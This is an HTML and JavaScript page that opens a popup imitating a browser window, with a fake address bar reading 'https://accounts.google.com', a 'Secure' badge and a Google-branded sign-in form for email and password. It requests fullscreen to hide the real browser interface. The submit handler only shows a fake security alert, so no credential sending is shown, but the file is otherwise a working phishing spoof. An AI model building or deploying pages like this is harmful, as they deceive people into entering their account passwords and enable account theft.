<!DOCTYPE html>
<html>
<body>
<button onclick="fullscreenSpoof()">Enter Google Workspace</button>

<script>
function fullscreenSpoof() {
    let win = window.open("", "_blank", "width=1200,height=800,location=no,toolbar=no");
    
    let fullscreenSpoof = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Google Accounts</title>
        <style>
            /* Fake browser chrome */
            .browser-chrome {
                background: #f1f3f4;
                padding: 10px 15px;
                border-bottom: 1px solid #dadce0;
                display: flex;
                align-items: center;
                gap: 10px;
            }
            .url-bar {
                flex: 1;
                background: white;
                padding: 8px 15px;
                border: 1px solid #dadce0;
                border-radius: 20px;
                font-family: Arial;
                font-size: 14px;
                color: #1a73e8;
            }
            .security-badge {
                color: #0d652d;
                font-weight: bold;
                font-size: 12px;
            }
            .browser-controls {
                display: flex;
                gap: 5px;
            }
            .control { width: 12px; height: 12px; border-radius: 50%; }
            .close { background: #ff5f57; }
            .minimize { background: #ffbd2e; }
            .maximize { background: #28c940; }
        </style>
    </head>
    <body>
        <!-- Fake Browser UI -->
        <div class="browser-chrome">
            <div class="browser-controls">
                <div class="control close"></div>
                <div class="control minimize"></div>
                <div class="control maximize"></div>
            </div>
            <div class="url-bar">
                <strong>https://accounts.google.com</strong> <span class="security-badge"> Secure</span>
            </div>
        </div>
        
        <!-- Actual Google-like content -->
        <div style="max-width:450px;margin:80px auto;padding:20px">
            <div style="text-align:center">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png" style="height:40px">
            </div>
            <h1 style="text-align:center;font-size:24px;font-weight:400;margin:20px 0">Sign in</h1>
            <p style="text-align:center;color:#5f6368;margin-bottom:30px">Use your Google Account</p>
            
            <form style="margin-top:30px">
                <input type="email" placeholder="Email or phone" style="width:100%;padding:15px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box" required>
                <input type="password" placeholder="Enter your password" style="width:100%;padding:15px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box" required>
                <button type="submit" style="width:100%;background:#1a73e8;color:white;padding:12px;border:none;border-radius:4px;font-size:16px;cursor:pointer;margin-top:20px">Next</button>
            </form>
            
            <div style="text-align:center;margin-top:40px;color:#5f6368;font-size:12px">
                <a href="#" style="color:#1a73e8;text-decoration:none">Forgot email?</a> â€¢ 
                <a href="#" style="color:#1a73e8;text-decoration:none">Create account</a>
            </div>
        </div>

        <script>
            // Enter fullscreen untuk hide browser UI asli
            document.addEventListener('click', function() {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();
                }
            });
            
            // Handle form submission
            document.querySelector('form').addEventListener('submit', function(e) {
                e.preventDefault();
                alert('Security verification required. Please check your email.');
            });
        <\/script>
    </body>
    </html>`;
    
    win.document.write(fullscreenSpoof);
    win.document.close();
    
    // Focus dan attempt fullscreen
    setTimeout(() => {
        win.focus();
    }, 1000);
}
</script>
</body>
</html>
